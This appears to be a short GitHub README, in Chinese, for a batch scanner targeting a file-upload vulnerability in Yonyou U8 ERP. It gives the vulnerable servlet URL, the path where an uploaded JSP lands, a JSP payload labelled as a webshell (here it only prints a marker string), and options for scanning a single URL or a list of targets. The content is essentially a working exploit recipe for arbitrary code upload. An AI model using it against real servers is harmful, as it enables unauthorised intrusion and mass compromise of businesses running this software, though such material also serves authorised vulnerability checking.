# -U8-
用友U8文件上传批量检测脚本
![image](https://github.com/user-attachments/assets/250f39fa-3d28-46ef-8018-218383b028f2)
vulnurl = url + "/servlet/FileUpload?fileName=1.jsp&actionID=update"  #漏洞页面信息
okurl = url + "/R9iPortal/upload/1.jsp" # 上传文件的地址
data = """<% out.println("24k");%>"""  # Webshell
parser.add_argument('-u','--url', type=str, help='单个漏洞网址')
parser.add_argument('-f','--file', type=str, help='批量检测文本')
